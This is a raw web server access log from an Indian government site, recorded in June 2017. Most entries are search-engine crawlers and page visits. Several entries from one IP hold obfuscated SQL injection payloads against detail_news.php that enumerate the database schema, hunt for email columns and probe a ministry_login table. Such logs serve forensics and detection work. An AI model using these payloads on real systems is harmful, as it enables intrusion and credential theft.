46.161.9.14 - - [10/Jun/2017:05:34:27 +0530] "POST /approved_projects.php HTTP/1.1" 200 17310 "http://cdmindia.gov.in/approved_projects.php?n=1" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:34:28 +0530] "GET /approved_projects.php HTTP/1.1" 200 16644 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:34:29 +0530] "GET /approval_process.php HTTP/1.1" 200 25914 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:04 +0530] "GET /approved_projects.php?n=1 HTTP/1.1" 200 16644 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:05 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:06 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:06 +0530] "GET /aboutus.php HTTP/1.1" 200 19599 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:12 +0530] "GET /contactus.php HTTP/1.1" 200 18294 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:13 +0530] "GET /sitemap.php HTTP/1.1" 200 18471 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:16 +0530] "GET /constitution.php HTTP/1.1" 200 23671 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:17 +0530] "GET /capacity_building.php HTTP/1.1" 200 19188 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:18 +0530] "GET /future_projects.php HTTP/1.1" 302 26212 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
40.77.167.85 - - [10/Jun/2017:05:35:19 +0530] "GET /news_more.php HTTP/1.1" 200 21063 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
46.161.9.14 - - [10/Jun/2017:05:35:20 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:21 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:21 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22413 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
46.161.9.14 - - [10/Jun/2017:05:35:22 +0530] "GET /imp_links.php HTTP/1.1" 200 17836 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
5.255.253.66 - - [10/Jun/2017:05:35:28 +0530] "GET /project_details_view_report.php?id=980 HTTP/1.1" 200 13139 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.79.131 - - [10/Jun/2017:05:35:32 +0530] "GET /project_details_view.php?id=598 HTTP/1.1" 200 15572 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.85 - - [10/Jun/2017:05:37:51 +0530] "GET /project_details_view.php?id=1190 HTTP/1.1" 200 15468 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
74.208.124.190 - - [10/Jun/2017:05:39:14 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:15 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:16 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25),4,5+and+'0'='0 HTTP/1.1" 200 18129 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:18 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0 HTTP/1.1" 200 18153 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:20 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0 HTTP/1.1" 200 18130 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:21 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0 HTTP/1.1" 200 18163 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:22 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_communicate_comments),4,5+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_communicate_comments),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:25 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0 HTTP/1.1" 200 18163 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:27 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_future_projects_info),4,5+and+'0'='0 HTTP/1.1" 200 18131 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_future_projects_info),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:05:39:28 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+3,1),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+3,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
157.55.39.165 - - [10/Jun/2017:05:39:33 +0530] "GET /imp_links.php HTTP/1.1" 200 17836 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
54.209.249.199 - - [10/Jun/2017:05:40:37 +0530] "GET /project_details_view.php?id=995 HTTP/1.1" 200 15634 "-" "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31"
66.249.79.131 - - [10/Jun/2017:05:40:43 +0530] "GET /project_details_view_report.php?id=413 HTTP/1.1" 200 13196 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [10/Jun/2017:05:41:33 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
180.76.15.159 - - [10/Jun/2017:05:42:05 +0530] "GET /project_details_view.php?id=1084 HTTP/1.1" 200 15330 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
35.184.189.105 - - [10/Jun/2017:05:42:38 +0530] "GET /news_more.php HTTP/1.1" 200 21063 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.133 - - [10/Jun/2017:05:43:32 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22413 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.165 - - [10/Jun/2017:05:45:34 +0530] "GET /constitution.php HTTP/1.1" 200 23671 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.129 - - [10/Jun/2017:05:45:52 +0530] "GET /project_details_view.php?id=194 HTTP/1.1" 200 15144 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.156 - - [10/Jun/2017:05:47:36 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.129 - - [10/Jun/2017:05:51:03 +0530] "GET /project_details_view.php?id=1479 HTTP/1.1" 200 15984 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.156 - - [10/Jun/2017:05:51:18 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.248 - - [10/Jun/2017:05:52:35 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.79.133 - - [10/Jun/2017:05:56:12 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=128 HTTP/1.1" 200 21767 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.48.68.247 - - [10/Jun/2017:05:57:45 +0530] "GET / HTTP/1.0" 200 19482 "http://www.cdmindia.gov.in/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
157.55.39.165 - - [10/Jun/2017:06:00:16 +0530] "GET /constitution.php HTTP/1.1" 200 23671 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:06:00:30 +0530] "GET /js/index_validations.js HTTP/1.1" 200 3143 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:00:34 +0530] "GET /images/h_cons.jpg HTTP/1.1" 200 21924 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.133 - - [10/Jun/2017:06:01:22 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=85 HTTP/1.1" 200 22019 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.98 - - [10/Jun/2017:06:01:56 +0530] "GET /contactus.php HTTP/1.1" 200 18294 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:04:03 +0530] "GET /contactus.php HTTP/1.1" 200 18294 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
131.253.27.12 - - [10/Jun/2017:06:04:07 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://cdmindia.gov.in/contactus.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
131.253.27.12 - - [10/Jun/2017:06:04:07 +0530] "GET /js/index_validations.js HTTP/1.1" 200 3143 "http://cdmindia.gov.in/contactus.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.167.85 - - [10/Jun/2017:06:04:50 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19084 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:04:51 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:04:52 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
37.48.68.247 - - [10/Jun/2017:06:05:27 +0530] "GET /index.php HTTP/1.0" 200 19482 "http://www.cdmindia.gov.in/index.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:29 +0530] "GET /aboutus.php HTTP/1.0" 200 19599 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:30 +0530] "GET /contactus.php HTTP/1.0" 200 18294 "http://www.cdmindia.gov.in/contactus.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:32 +0530] "GET /sitemap.php HTTP/1.0" 200 18471 "http://www.cdmindia.gov.in/sitemap.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:38 +0530] "GET /constitution.php HTTP/1.0" 200 23671 "http://www.cdmindia.gov.in/constitution.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:40 +0530] "GET /approval_process.php HTTP/1.0" 200 25914 "http://www.cdmindia.gov.in/approval_process.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:42 +0530] "GET /capacity_building.php HTTP/1.0" 200 19188 "http://www.cdmindia.gov.in/capacity_building.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:46 +0530] "GET /future_projects.php HTTP/1.0" 200 26212 "http://www.cdmindia.gov.in/future_projects.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
37.48.68.247 - - [10/Jun/2017:06:05:47 +0530] "GET /reports_new.php?n=1 HTTP/1.0" 200 22413 "http://www.cdmindia.gov.in/reports_new.php?n=1" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
157.55.39.156 - - [10/Jun/2017:06:06:23 +0530] "GET /project_details_view.php?id=51 HTTP/1.1" 200 14889 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [10/Jun/2017:06:06:31 +0530] "GET /project_details_view_report.php?id=830 HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
